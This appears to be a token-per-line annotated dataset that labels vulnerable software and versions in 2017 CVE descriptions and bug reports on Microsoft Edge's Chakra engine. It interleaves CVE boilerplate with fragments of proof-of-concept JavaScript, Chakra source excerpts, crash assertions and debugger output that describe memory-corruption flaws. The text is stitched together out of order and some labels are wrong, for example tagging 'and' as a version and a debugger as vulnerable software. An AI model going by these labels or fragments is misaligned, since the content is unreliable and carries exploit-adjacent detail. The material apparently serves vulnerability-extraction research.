, O O
CVE-2017-8657 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

But O O
this O O
time O O
, O O
it O O
happends O O
in O O
Parser O O
: O O
:ParseFncFormals O O
with O O
the O O
PNodeFlags O O
: O O
:fpnArguments_overriddenInParam O O
flag O O
. O O

Microsoft O O
Edge O O
Chakra O O
- O O
Uninitialized O O
Arguments O O
( O O
2 O O
) O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8653 O O
. O O

Microsoft O O
browsers O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
Microsoft O O
browsers O O
improperly O O
handling O O
objects O O
in O O
memory O O
while O O
rendering O O
content O O
, O O
aka O O
Microsoft O O
Browser O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Microsoft S-vulnerable_software pair_0
Outlook S-vulnerable_software pair_0
2007 S-vulnerable_version pair_0
SP3 S-vulnerable_version pair_0
, O O
Outlook S-vulnerable_software pair_1
2010 O O
SP2 S-vulnerable_version pair_1
, O O
Outlook S-vulnerable_software pair_2
2013 S-vulnerable_version pair_2
SP1 S-vulnerable_version pair_2
, O O
Outlook S-vulnerable_software pair_3
2013 S-vulnerable_version pair_3
RT S-vulnerable_version pair_3
SP1 S-vulnerable_version pair_3
, O O
and O O
Outlook S-vulnerable_software pair_4
2016 S-vulnerable_version pair_4
as O O
packaged O O
in O O
Microsoft O O
Office O O
allows O O
a O O
remote O O
code O O
execution O O
vulnerability O O
due O O
to O O
the O O
way O O
Microsoft O O
Outlook O O
parses O O
specially O O
crafted O O
email O O
messages O O
, O O
aka O O
Microsoft O O
Office O O
Outlook O O
Memory O O
Corruption O O
Vulnerability O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
affected O O
Microsoft O O
scripting O O
engines O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Edge O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8649 O O
, O O
CVE-2017-8729 O O
, O O
CVE-2017-8738 O O
, O O
CVE-2017-8740 O O
, O O
CVE-2017-8741 O O
, O O
CVE-2017-8748 O O
, O O
CVE-2017-8752 O O
, O O
CVE-2017-8753 O O
, O O
CVE-2017-8755 O O
, O O
CVE-2017-8756 O O
, O O
and O O
CVE-2017-11764 O O
. O O

A O O
remote O O
code O O
execution O O
vulnerability O O
exists O O
in O O
the O O
way O O
that O O
the O O
Chakra O O
JavaScript O O
engine O O
renders O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

All O O
rights O O
reserved O O
. O O

Flags O O
: O O
allow-natives-syntax O O
assertEquals O O
= O O
print O O
; O O
var O O
m O O
= O O
( O O
function O O
( O O
) O O
{ O O
use O O
asm O O
; O O
function O O
f O O
( O O
x O O
) O O
{ O O
return O O
x O O
< O O
0 O O
; O O
} O O
function O O
g O O
( O O
x O O
) O O
{ O O
return O O
0 O O
< O O
x O O
; O O
} O O
return O O
{ O O
f O O
: O O
f O O
, O O
g O O
: O O
g O O
var O O
f O O
= O O
m.f O O
; O O
var O O
g O O
= O O
m.g O O
; O O
var O O
counter O O
= O O
0 O O
; O O
function O O
deopt O O
( O O
f O O
) O O
{ O O
return O O
{ O O
toString O O
: O O
function O O
( O O
) O O
{ O O
print O O
( O O
f O O
) O O
; O O
counter++ O O
; O O
return O O
2 O O
assertEquals O O
( O O
false O O
, O O
f O O
( O O
deopt O O
( O O
f O O
) O O
) O O
) O O
; O O
assertEquals O O
( O O
1 O O
, O O
counter O O
) O O
; O O
assertEquals O O
( O O
true O O
, O O
g O O
( O O
deopt O O
( O O
g O O
) O O
) O O
) O O
; O O
assertEquals O O
( O O
2 O O
, O O
counter O O
) O O
; O O
print O O
( O O
f O O
) O O
; O O
assertEquals O O
( O O
false O O
, O O
f O O
( O O
deopt O O
( O O
f O O
) O O
) O O
) O O
; O O
assertEquals O O
( O O
3 O O
, O O
counter O O
) O O
; O O
print O O
( O O
g O O
) O O
; O O
assertEquals O O
( O O
true O O
, O O
g O O
( O O
deopt O O
( O O
g O O
) O O
) O O
) O O
; O O
assertEquals O O
( O O
4 O O
, O O
counter O O
) O O
; O O

Use O O
of O O
this O O
source O O
code O O
is O O
governed O O
by O O
a O O
BSD-style O O
license O O
that O O
can O O
be O O
found O O
in O O
the O O
LICENSE O O
file O O
. O O

In O O
the O O
debug O O
build O O
of O O
Chakra O O
, O O
this O O
script O O
hits O O
the O O
following O O
assert O O
: O O
ASSERTION O O
19041 O O
: O O
( O O
/home/user/test_everywhere/ChakraCore/lib/Common/DataStructures/List.h O O
, O O
line O O
329 O O
) O O
index O O
> O O
= O O
0 O O
& O O
& O O
index O O
< O O
this- O O
> O O
count O O
Failure O O
: O O
( O O
index O O
> O O
= O O
0 O O
& O O
& O O
index O O
< O O
this- O O
> O O
count O O
) O O
Illegal O O
instruction O O
( O O
core O O
dumped O O
) O O
The O O
attached O O
script O O
is O O
a O O
test O O
case O O
from O O
the O O
v8 O O
( O O
Chrome O O
) O O
test O O
repository O O
, O O
minimized O O
to O O
show O O
the O O
issue O O
. O O

The O O
out-of-bounds O O
value O O
is O O
then O O
treated O O
as O O
the O O
pointer O O
to O O
the O O
source O O
. O O

testRunner.waitUntilDone O O
( O O
) O O
; O O
++promiseTestCount O O
; O O
return O O
promiseTestChain.then O O
( O O
test_promise O O
) O O
; O O
} O O
; O O
assertUnoptimized O O
= O O
function O O
assertUnoptimized O O
( O O
fun O O
, O O
sync_opt O O
, O O
name_opt O O
) O O
{ O O
if O O
( O O
sync_opt O O
undefined O O
) O O
sync_opt O O
var O O
opt_status O O
= O O
OptimizationStatus O O
( O O
fun O O
, O O
sync_opt O O
) O O
; O O
Tests O O
that O O
use O O
assertOptimized O O
( O O
) O O
do O O
not O O
make O O
sense O O
if O O
always-opt O O
option O O
is O O
provided O O
. O O

Such O O
tests O O
must O O
add O O
no-always-opt O O
to O O
flags O O
comment O O
. O O

This O O
is O O
likely O O
an O O
exploitable O O
condition O O
. O O

Such O O
tests O O
must O O
add O O
opt O O
to O O
flags O O
comment O O
. O O

The O O
attached O O
JavaScript O O
file O O
causes O O
an O O
out-of-bounds O O
access O O
of O O
the O O
source O O
buffer O O
when O O
fetching O O
the O O
source O O
for O O
one O O
of O O
the O O
functions O O
during O O
delayed O O
compilation O O
. O O

Microsoft O O
Edge O O
- O O
Out-of-Bounds O O
Access O O
when O O
Fetching O O
Source O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

This O O
function O O
is O O
supposed O O
to O O
call O O
SetIsCatch O O
for O O
all O O
the O O
symbols O O
in O O
the O O
exception O O
parameter O O
. O O

void O O
PreVisitCatch O O
( O O
ParseNode O O
pnode O O
, O O
ByteCodeGenerator O O
byteCodeGenerator O O
) O O
{ O O
Push O O
the O O
catch O O
scope O O
and O O
add O O
the O O
catch O O
expression O O
to O O
it O O
. O O

The O O
one O O
for O O
the O O
whole O O
function O O
scope O O
is O O
initialized O O
with O O
undefined O O
at O O
the O O
start O O
of O O
the O O
function O O
. O O

( O O
pnode- O O
> O O
sxVar.isBlockScopeFncDeclVar O O
& O O
& O O
sym- O O
> O O
GetIsBlockVar O O
if O O
( O O
sym- O O
> O O
GetIsCatch O O
pnode- O O
> O O
nop O O
knopVarDecl O O
& O O
& O O
sym- O O
> O O
GetIsBlockVar O O
sym O O
= O O
funcInfo- O O
> O O
bodyScope- O O
> O O
FindLocalSymbol O O
( O O
sym- O O
> O O
GetName O O
( O O
) O O
) O O
; O O
This O O
returns O O
the O O
symbol O O
for O O
the O O
function O O
scope O O
. O O

If O O
the O O
bytecode O O
generator O O
incorrectly O O
chooses O O
the O O
x O O
to O O
initialize O O
, O O
the O O
x O O
for O O
the O O
function O O
scope O O
may O O
remain O O
uninitialized O O
. O O

The O O
PoC O O
reproduces O O
that O O
case O O
, O O
the O O
x O O
for O O
the O O
function O O
scope O O
will O O
refer O O
to O O
an O O
uninitialized O O
value O O
in O O
the O O
stack O O
. O O

This O O
choice O O
is O O
made O O
in O O
the O O
following O O
code O O
in O O
ByteCodeGenerator O O
: O O
:DefineUserVars O O
. O O

void O O
ByteCodeGenerator O O
: O O
:DefineUserVars O O
( O O
FuncInfo O O
funcInfo O O
for O O
( O O
pnode O O
= O O
funcInfo- O O
> O O
root- O O
> O O
sxFnc.pnodeVars O O
; O O
pnode O O
; O O
pnode O O
= O O
pnode- O O
> O O
sxVar.pnodeNext O O
) O O
{ O O
Symbol O O
sym O O
= O O
pnode- O O
> O O
sxVar.sym O O
; O O
if O O
( O O
sym O O
! O O
= O O
nullptr O O
& O O
& O O
! O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

Microsoft O O
browsers O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
SP2 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
Microsoft O O
browsers O O
improperly O O
accessing O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Browser O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8669 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft O O
Windows S-vulnerable_software pair_0
Server S-vulnerable_version pair_0
2008 S-vulnerable_version pair_0
SP2 S-vulnerable_version pair_0
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2012 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
Internet O O
Explorer O O
improperly O O
accessing O O
objects O O
in O O
memory O O
, O O
aka O O
Internet O O
Explorer O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

So O O
it O O
should O O
be O O
used O O
like O O
PushPopFrameHelper O O
holder O O
but O O
InterpreterStackFrame O O
: O O
:ProcessLinkFailedAsmJsModule O O
uses O O
it O O
like O O
a O O
function O O
. O O

The O O
PoC O O
will O O
crash O O
in O O
the O O
following O O
code O O
. O O

Var O O
InterpreterStackFrame O O
: O O
:ProcessLinkFailedAsmJsModule O O
PushPopFrameHelper O O
( O O
newInstance O O
, O O
_ReturnAddress O O
( O O
) O O
, O O
_AddressOfReturnAddress O O
It O O
pushes O O
newInstance O O
and O O
immediately O O
pop O O
it O O
. O O

} O O
function O O
f O O
( O O
v O O
) O O
{ O O
v O O
= O O
v O O
| O O
0 O O
; O O
return O O
v O O
| O O
0 O O
; O O
} O O
return O O
f O O
; O O
} O O
asmModule O O
( O O
1 O O
) O O
; O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

But O O
it O O
incorrectly O O
handles O O
the O O
case O O
where O O
the O O
function O O
is O O
a O O
class O O
. O O

In O O
the O O
PoC O O
, O O
it O O
binds O O
the O O
information O O
of O O
the O O
method O O
f O O
( O O
f2 O O
in O O
the O O
latest O O
release O O
version O O
of O O
Edge O O
) O O
to O O
the O O
constructor O O
. O O

The O O
PoC O O
hits O O
the O O
following O O
assertion O O
in O O
the O O
debug O O
build O O
. O O

So O O
it O O
may O O
result O O
in O O
binding O O
incorrect O O
information O O
to O O
the O O
constructor O O
. O O

It O O
starts O O
to O O
parse O O
from O O
the O O
start O O
of O O
the O O
class O O
declaration O O
instead O O
of O O
the O O
constructor O O
. O O

FuncInfo O O
ByteCodeGenerator O O
: O O
:StartBindFunction O O
( O O
const O O
char16 O O
name O O
, O O
uint O O
nameLength O O
, O O
uint O O
shortNameOffset O O
, O O
bool O O
pfuncExprWithName O O
, O O
ParseNode O O
pnode O O
, O O
Js O O
: O O
:ParseableFunctionInfo O O
reuseNestedFunc O O
) O O
{ O O
bool O O
funcExprWithName O O
; O O
Js O O
: O O
:ParseableFunctionInfo O O
parseableFunctionInfo O O
= O O
nullptr O O
; O O
Js O O
: O O
:AutoRestoreFunctionInfo O O
autoRestoreFunctionInfo O O
( O O
reuseNestedFunc O O
, O O
reuseNestedFunc O O

reuseNestedFunc- O O
> O O
GetOriginalEntryPoint O O
( O O
) O O
: O O
nullptr O O
) O O
; O O
if O O
( O O
this- O O
> O O
pCurrentFunction O O
& O O
& O O
this- O O
> O O
pCurrentFunction- O O
> O O
IsFunctionParsed O O
( O O
) O O
) O O
{ O O
Assert O O
( O O
this- O O
> O O
pCurrentFunction- O O
> O O
StartInDocument O O
( O O
) O O
pnode- O O
> O O
ichMin O O
) O O
; O O
here O O
this- O O
> O O
pCurrentFunction O O
is O O
the O O
consturctor O O
, O O
but O O
pnode O O
refers O O
to O O
the O O
method O O
f O O
. O O

Microsoft O O
browsers O O
in O O
Microsoft O O
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

This O O
issue O O
can O O
be O O
reproduced O O
steadly O O
in O O
uptodate O O
Edge O O
in O O
Win10 O O
WIP O O
. O O

chakra O O
! O O
utf8 O O
: O O
:EncodeIntoImpl O O
< O O
1 O O
> O O
+0xb5 O O
: O O
00007ffc`dbdb69e5 O O
418910 O O
mov O O
dword O O
ptr O O
[ O O
r8 O O
] O O
, O O
edx O O
ds:0000023d`22d81000 O O

Assert O O
( O O
cbSource O O
+ O O
1 O O
< O O
= O O
cbUtf8Buffer O O
) O O
; O O
SRCINFO O O
const O O
pSrcInfo O O
= O O
scriptContext- O O
> O O
GetModuleSrcInfo O O
( O O
moduleID O O
LEAVE_PINNED_SCOPE O O
( O O
) O O
; O O
} O O
END_TRANSLATE_EXCEPTION_TO_HRESULT O O
( O O
hr O O
) O O
; O O
END_LEAVE_SCRIPT_INTERNAL O O
( O O
scriptContext O O
) O O
; O O
ifdef O O
PROFILE_EXEC O O
scriptContext- O O
> O O
ProfileEnd O O
( O O
Js O O
: O O
:EvalCompilePhase O O
) O O
; O O
endif O O
THROW_KNOWN_HRESULT_EXCEPTIONS O O
( O O
hr O O
, O O
scriptContext O O
) O O
; O O
if O O
( O O
! O O
SUCCEEDED O O
( O O
hrParser O O
) O O
) O O
{ O O
JavascriptError O O
: O O
:ThrowParserError O O
( O O
scriptContext O O
, O O
hrParser O O
, O O
& O O
se O O
) O O
; O O
} O O
else O O
if O O
( O O
! O O
SUCCEEDED O O
( O O
hrCodeGen O O
else O O
ScriptFunction O O
pfuncScript O O
= O O
funcBody- O O
> O O
IsCoroutine O O
( O O
) O O

second O O
chance O O
! O O
! O O
! O O
) O O

ArenaAllocator O O
tempArena O O
( O O
_u O O
( O O
EvalHelperArena O O
) O O
, O O
scriptContext- O O
> O O
GetThreadContext O O
( O O
) O O
- O O
> O O
GetPageAllocator O O
( O O
) O O
, O O
Js O O
: O O
:Throw O O
: O O
:OutOfMemory O O
) O O
; O O
LPUTF8 O O
utf8Source O O
= O O
AnewArray O O
( O O
& O O
tempArena O O
, O O
utf8char_t O O
, O O
cbUtf8Buffer O O
) O O
; O O
Allocate O O
memory O O
on O O
Arena O O
heap O O
with O O
a O O
incorrect O O
but O O
smaller O O
size O O
Assert O O
( O O
cchSource O O
< O O
MAXLONG O O
) O O
; O O
size_t O O
cbSource O O
= O O
utf8 O O
: O O
:EncodeIntoAndNullTerminate O O
( O O
utf8Source O O
, O O
source O O
, O O
static_cast O O
< O O
charcount_t O O
> O O
( O O
cchSource O O
) O O
) O O
; O O
OOB O O
write O O
HERE O O
! O O
! O O
! O O

dest O O
+= O O
4 O O
; O O
source O O
+= O O
4 O O
; O O
cch O O
-= O O
4 O O
; O O
} O O
LSlowPath O O
: O O
if O O
( O O
cesu8Encoding O O
else O O
return O O
dest O O
- O O
buffer O O
; O O
} O O
Microsoft S-vulnerable_software pair_0
( O O
R S-vulnerable_software pair_0
) O O
Windows S-vulnerable_software pair_0
Debugger S-vulnerable_software pair_0
Version O O
6.12.0002.633 S-vulnerable_version pair_0
AMD64 O O
Copyright O O
( O O
c O O
) O O
Microsoft O O
Corporation O O
. O O

An O O
exception O O
will O O
occur O O
immediatly O O
when O O
opening O O
POC.html O O
in O O
Edge O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

But O O
the O O
above O O
code O O
is O O
using O O
it O O
regardless O O
of O O
buildAST O O
. O O

m_currentNodeFunc- O O
> O O
grfpn O O
|= O O
PNodeFlags O O
: O O
: O O
fpnArguments_overriddenByDecl O O
m_currentNodeFunc O O
is O O
only O O
replaced O O
when O O
buildAST O O
is O O
true O O
. O O

Microsoft O O
Edge O O
Chakra O O
- O O
Uninitialized O O
Arguments O O
( O O
1 O O
) O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
